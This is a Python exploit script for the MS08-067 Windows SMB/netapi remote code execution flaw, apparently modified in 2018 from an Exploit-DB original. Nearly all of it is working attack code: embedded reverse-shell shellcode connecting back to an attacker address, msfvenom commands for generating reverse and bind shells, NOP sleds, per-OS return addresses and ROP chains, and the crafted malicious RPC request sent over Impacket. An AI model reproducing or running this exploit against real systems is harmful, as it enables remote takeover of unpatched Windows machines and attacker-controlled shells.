#!/usr/bin/env python
import struct
import time
import sys
from threading import Thread  # Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    #from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError:
    print('Install the following library to make this script work')
    print('Impacket : https://github.com/CoreSecurity/impacket.git')
    print('PyCrypto : https://pypi.python.org/pypi/pycrypto')
    sys.exit(1)

print ('#######################################################################')
print ('#   MS08-067 Exploit')
print ('#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).')
print ('#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi')
print ('#')
print ('#   Mod in 2018 by Andy Acer')
print ('#   - Added support for selecting a target port at the command line.')
print ('#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport')
print ('#   - Changed shellcode handling to allow for variable length shellcode.')
print ('#######################################################################\n')

print ('''
$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .

''')

print('#######################################################################\n')


# ------------------------------------------------------------------------
# REPLACE THIS SHELLCODE with shellcode generated for your use
# Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
#
# Example msfvenom commands to generate shellcode:
# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Reverse TCP to 192.168.119.204 port 62000:
shellcode =b"\x31\xc9\x83\xe9\xa2\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
shellcode +=b"\x0e\xbe\x8e\x51\x8d\x83\xee\xfc\xe2\xf4\x42\x66\xde\x8d"
shellcode +=b"\xbe\x8e\x31\x04\x5b\xbf\x83\xe9\x35\xdc\x61\x06\xec\x82"
shellcode +=b"\xda\xdf\xaa\x81\xe6\xc7\x98\x05\x23\xa5\x8f\x71\x60\x4d"
shellcode +=b"\x12\xb2\x30\xf1\xbc\xa2\x71\x4c\x71\x83\x50\x4a\xf7\xfb"
shellcode +=b"\xbe\xdf\x35\xdc\x41\x06\xfc\xb2\x50\x5d\x35\xce\x29\xda"
shellcode +=b"\x3b\x4e\x25\xc1\xbf\x5e\xda\xd5\x9e\xde\xda\xc5\xa6\x8f"
shellcode +=b"\x82\x08\x77\xfa\x6d\xc4\x8f\x71\xda\xb9\x35\x8f\x87\xbc"
shellcode +=b"\x7e\x22\x90\x42\xb3\x8f\x96\xb5\x5e\xfb\xa5\x8e\xc3\x76"
shellcode +=b"\x6a\xf0\x9a\xfb\xb1\xd5\x35\xd6\x75\x8c\x6d\xe8\xda\x81"
shellcode +=b"\xf5\x05\x09\x91\xbf\x5d\xda\x89\x35\x8f\x81\x04\xfa\xaa"
shellcode +=b"\x75\xd6\xe5\xef\x08\xd7\xef\x71\xb1\xd5\xe1\xd4\xda\x9f"
shellcode +=b"\x57\x0e\xae\x72\x41\xd3\x39\xbe\x8c\x8e\x51\xe5\xc9\xfd"
shellcode +=b"\x63\xd2\xea\xe6\x1d\xfa\x98\x89\xd8\x65\x41\x5e\xe9\x1d"
shellcode +=b"\xbf\x8e\x51\xa4\x7a\xda\x01\xe5\x97\x0e\x3a\x8d\x41\x5b"
shellcode +=b"\x3b\x87\xd6\x84\x5b\x9d\xb2\xe6\x53\x8d\xaf\xd2\xd8\x6b"
shellcode +=b"\xee\xde\x01\xdd\xfe\xde\x11\xdd\xd6\x64\x5e\x52\x5e\x71"
shellcode +=b"\x84\x1a\xd4\x9e\x07\xda\xd6\x17\xf4\xf9\xdf\x71\x84\x08"
shellcode +=b"\x7e\xfa\x5b\x72\xf0\x86\x24\x61\x56\xe9\x51\x8d\xbe\xe4"
shellcode +=b"\x51\xe7\xba\xd8\x06\xe5\xbc\x57\x99\xd2\x41\x5b\xd2\x75"
shellcode +=b"\xbe\xf0\x67\x06\x88\xe4\x11\xe5\xbe\x9e\x51\x8d\xe8\xe4"
shellcode +=b"\x51\xe5\xe6\x2a\x02\x68\x41\x5b\xc2\xde\xd4\x8e\x07\xde"
shellcode +=b"\xe9\xe6\x53\x54\x76\xd1\xae\x58\x3d\x76\x51\xf0\x96\xd6"
shellcode +=b"\x39\x8d\xfe\x8e\x51\xe7\xbe\xde\x39\x86\x91\x81\x61\x72"
shellcode +=b"\x6b\xd9\x39\xf8\xd0\xc3\x30\x72\x6b\xd0\x0f\x72\xb2\xaa"
shellcode +=b"\x5e\x08\xce\x71\xae\x72\x57\x15\xae\x72\x41\x8f\x92\xa4"
shellcode +=b"\x78\xfb\x90\x4e\x05\x6e\x4c\xa7\xb4\xe6\xf7\x18\x03\x13"
shellcode +=b"\xae\x58\x82\x88\x2d\x87\x3e\x75\xb1\xf8\xbb\x35\x16\x9e"
shellcode +=b"\xcc\xe1\x3b\x8d\xed\x71\x84\x8d"
# ------------------------------------------------------------------------

# Gotta make No-Ops (NOPS) + shellcode = 410 bytes
num_nops = 410 - len(shellcode)
newshellcode = b"\x90" * num_nops
newshellcode += shellcode  # Add NOPS to the front
shellcode = newshellcode   # Switcheroo with the newshellcode temp variable

print("Shellcode length: %s\n\n" % len(shellcode))

nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
    "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
    28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
module_base = 0x6f880000


def generate_rop(rvas):
    gadget1 = b"\x90\x5a\x59\xc3"
    gadget2 = [b"\x90\x89\xc7\x83", b"\xc7\x0c\x6a\x7f", b"\x59\xf2\xa5\x90"]
    gadget3 = b"\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()

        # MODIFIED HERE
        # Changed __port to port ... not sure if that does anything. I'm a newb.
        self.port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print('Windows XP SP0/SP1 Universal\n')
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print('Windows 2000 Universal\n')
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print('Windows 2003 SP0 Universal\n')
            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print('Windows 2003 SP1 English\n')
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print('Windows XP SP3 French (NX)\n')
            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print('Windows XP SP3 English (NX)\n')
            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print('Windows XP SP3 English (AlwaysOn NX)\n')
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + b"AB"
        else:
            print('Not supported OS version\n')
            sys.exit(-1)

        print('[-]Initiating connection')

        # MORE MODIFICATIONS HERE #############################################################################################

        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        else:
            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to 
            #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.

            self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
        
        self.__trans.connect()
        print('[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = b"\x5c\x00" + b"ABCDEFGHIJ" * 10 + shellcode + b"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
            b"\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + b"\x00" * 2
        server = b"\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = b"\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        
        # NEW HOTNESS
        # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
        #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
        #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
        #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
        MaxCount = b"\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
        Offset = b"\x00\x00\x00\x00"
        ActualCount = b"\x36\x01\x00\x00" # Decimal 310. => Path length of 620

        self.__stub = server + MaxCount + Offset + ActualCount + \
            path + b"\xE8\x03\x00\x00" + prefix + b"\x01\x10\x00\x00\x00\x00\x00\x00"        

        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(3)
        print('Exploit finish\n')

if __name__ == '__main__':
       try:
           target = sys.argv[1]
           os = sys.argv[2]
           port = sys.argv[3]
       except IndexError:
                print('\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0])
                print('Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445')
                print('Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)')
                print('Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal')
                print('Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English')
                print('Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)')
                print('Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)')
                print('Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)')
                print('')
                print('FYI: nmap has a good OS discovery script that pairs well with this exploit:')
                print('nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1')
                print('')
                sys.exit(-1)


current = SRVSVC_Exploit(target, os, port)
current.start()
